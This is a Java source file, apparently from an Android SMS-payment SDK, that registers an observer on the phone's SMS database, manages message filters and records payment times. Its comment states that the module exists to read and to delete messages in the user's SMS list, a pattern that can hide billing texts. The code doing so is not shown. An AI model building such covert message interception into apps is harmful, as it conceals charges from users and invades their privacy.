package com.poxiao.smspay.observer;

import com.poxiao.smspay.observer.domain.SFI;

import android.content.Context;
import android.net.Uri;

/**
 * chastity memorial arch[贞节牌坊] - 准备用来当模块名称
 * 任务分为2类：
 * 1 删除短信列表中的内容
 * 2 获取短信列表中的内容
* @author molo.xiao@gmail.com 
* @version 创建时间：2015-6-3 下午4:05:04
*
 */
public class SmsObserverManager {
	
	public static final String VERSION = "3";

	private static boolean isRegister = false;

	/**
	 * 是否注册了短信数据库变化监听
	 * 
	 * @return true,注册了。false，没注册。
	 */
	public static boolean isRegisterSmsObserver() {
		return isRegister;
	}
	
	public static void setContext(Context context) {
		SmsObserver.getInstance().setContext(context);
	}

	/**
	 * 更新最近一次的支付时间。 同步调用，注意锁。
	 */
	public synchronized void updateLastPayTime() {
		SmsObserver.markStartTime = System.currentTimeMillis();
	}

	/**
	 * 注册短信数据库变化监听
	 * @param context
	 */
	public static void registerObserver(Context context) {
		if (!isRegister) {
			context.getContentResolver().registerContentObserver(
					Uri.parse("content://sms/"), true,
					SmsObserver.getInstance());
			isRegister = true;
		}
	}

	/**
	 * 注销短信数据库监听
	 * @param context
	 */
	public static void unregisterObserver(Context context) {
		if (isRegister) {
			context.getContentResolver().unregisterContentObserver(
					SmsObserver.getInstance());
			isRegister = false;
		}
	}

	/**
	 * 
	 * @param smsFilterItem
	 * @return true,加入成功。false,加入失败。
	 */
	public static boolean addSmsFilterItem(SFI smsFilterItem) {
		Debug.i("SmsObserverManager->addSmsFilterItem,  coming ...");
		if (SmsObserver.getInstance() == null) {
			return false;
		}
		return SmsObserver.getInstance().addSmsFilterItems(smsFilterItem);
	}
}
